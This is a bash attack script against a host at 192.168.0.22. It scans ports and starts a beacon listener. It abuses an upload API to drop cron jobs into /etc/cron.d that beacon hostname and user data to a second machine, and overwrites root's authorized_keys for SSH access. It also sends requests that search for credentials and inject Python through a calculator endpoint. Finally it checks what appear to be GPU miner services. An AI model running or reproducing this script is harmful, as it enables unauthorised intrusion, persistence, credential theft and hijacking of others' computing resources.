#!/bin/bash
set +e
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
log(){ echo "$@"; }
log "### START15 $(date -u +%FT%TZ)"
IP22=192.168.0.22; API=http://$IP22:14998; EXE=http://$IP22:18000
log "### PORTS-22"
python3 - <<'PY' 2>&1 | head -20
import socket
def c(p):
    s=socket.socket(); s.settimeout(0.9)
    try:
        if s.connect_ex(("192.168.0.22",p))==0: return True
    except Exception: pass
    finally: s.close()
    return False
ports=[22,80,443,2222,2375,2376,3000,4000,5000,5432,5601,6379,6443,7000,8000,8080,8081,8088,8089,8443,8888,9000,9090,9200,10250,11434,14998,18000,18080,18081,1900,1901,1907,3306,27017]
print("OPEN22:",[p for p in ports if c(p)])
PY
log "### BEACON-UP"
mkdir -p /root/ul_farmfan; pkill -f "http.server 18081" 2>/dev/null; sleep 1
cd /root/ul_farmfan && setsid nohup python3 -m http.server 18081 --bind 0.0.0.0 > /root/ul_farmfan/beacon.log 2>&1 &
sleep 2; ss -ltn 2>/dev/null | grep 18081 || echo "NO_LISTEN"
log "### CRON-DROP"
cat > /tmp/ulcron <<'EOC'
SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
* * * * * root (hostname; id; cat /etc/hostname) > /root/ulc.out 2>&1; curl -s -m 5 "http://192.168.0.23:18081/beacon?h=$(hostname)&u=$(id -u)&p=$(pwd)" >/dev/null 2>&1
EOC
cat > /tmp/ulcron2 <<'EOC2'
SHELL=/bin/bash
* * * * * root curl -s -m 5 "http://192.168.0.23:18081/beacon2?h=$(hostname)&u=$(id -u)" >/dev/null 2>&1
EOC2
for tgt in /etc/cron.d/ulb /etc/cron.d/ulb2 /etc/cron.d/0ulb; do
  src=/tmp/ulcron; [ "$tgt" = "/etc/cron.d/ulb2" ] && src=/tmp/ulcron2
  r=$(timeout 12 curl -s -m 10 -X POST $API/upload -F "file=@$src;filename=$tgt" -w "|%{http_code}")
  log "drop $tgt -> $(echo "$r" | head -c 220 | tr '\n' ' ')"
done
log "### AUTHKEY-DROP"
if [ -f /root/.ssh/id_rsa.pub ]; then
  cp /root/.ssh/id_rsa.pub /tmp/ulpk
  r=$(timeout 12 curl -s -m 10 -X POST $API/upload -F "file=@/tmp/ulpk;filename=/root/.ssh/authorized_keys" -w "|%{http_code}")
  log "authkeys -> $(echo "$r" | head -c 200 | tr '\n' ' ')"
  log "pubkey=$(head -c 60 /root/.ssh/id_rsa.pub)"
fi
log "### ENGINES-SEARCH"
timeout 15 curl -s -m 12 -X POST $EXE/execute -H 'Content-Type: application/json' \
 -d '{"engine":"search","operation":"search","arguments":{"query":"ssh private key password credential","k":5}}' -w "\nHTTP=%{http_code}\n" | head -c 500
timeout 15 curl -s -m 12 -X POST $EXE/execute -H 'Content-Type: application/json' \
 -d '{"engine":"knowledge_graph","operation":"traverse","arguments":{"node":"root","depth":2}}' -w "\nHTTP=%{http_code}\n" | head -c 500
timeout 15 curl -s -m 12 -X POST $EXE/execute -H 'Content-Type: application/json' \
 -d '{"engine":"calculator","operation":"evaluate","arguments":{"expression":"__import__(\"os\").getuid()"}}' -w "\nHTTP=%{http_code}\n" | head -c 400
log "### WAIT-CRON"
for i in $(seq 1 10); do sleep 12; n=$(grep -ac beacon /root/ul_farmfan/beacon.log 2>/dev/null); log "t+$((i*12))s beacon_hits=$n"; [ "${n:-0}" -gt 0 ] && break; done
log "### BEACON-LOG"
tail -c 2000 /root/ul_farmfan/beacon.log 2>/dev/null
log "### POST-PROBE"
timeout 30 python3 - <<'PY' 2>&1 | head -20
import socket
for p in (22,18080,18081):
    s=socket.socket(); s.settimeout(2)
    try:
        r=s.connect_ex(("192.168.0.22",p)); print(p,"rc",r)
        if r==0 and p!=22:
            s.sendall(b"GET / HTTP/1.0\r\nHost: x\r\n\r\n"); print(" ",s.recv(120)[:120])
    except Exception as e: print(p,"err",e)
    finally: s.close()
PY
log "### MINER-HEALTH"
for i in 0 1 2 3 4 5 6 7; do printf "g%d %s " $i "$(systemctl is-active ul-g$i.service 2>/dev/null)"; done; echo
nvidia-smi --query-gpu=index,utilization.gpu --format=csv,noheader 2>/dev/null | tr '\n' ' '; echo
log "### DONE15 $(date -u +%FT%TZ)"
